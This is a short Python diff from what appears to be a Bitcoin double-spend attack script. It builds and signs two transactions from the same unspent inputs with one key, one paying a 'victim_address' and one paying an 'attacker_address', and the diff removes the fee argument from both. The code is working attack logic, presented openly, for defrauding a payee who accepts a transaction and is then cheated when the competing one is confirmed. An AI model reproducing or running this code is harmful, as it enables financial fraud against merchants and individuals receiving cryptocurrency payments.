@@ -82,12 +82,12 @@ send_amount = to_satoshi(amount_btc)
 inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
 print(inputs)
 tx_victim = [{"address": victim_address, "value": send_amount}]
-tx_victim = transaction_util.mktx(inputs, tx_victim, fee=fee)
+tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim["outs"][0]["value"] = tx_victim["outs"][0]["value"]
 print(tx_victim)
 tx_victim = cryptos.serialize(transaction_util.signall(tx_victim, key))
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
-tx_attacker = transaction_util.mktx(inputs, tx_attacker, fee=fee)
+tx_attacker = transaction_util.mktx(inputs, tx_attacker)
 tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, key))
 print()
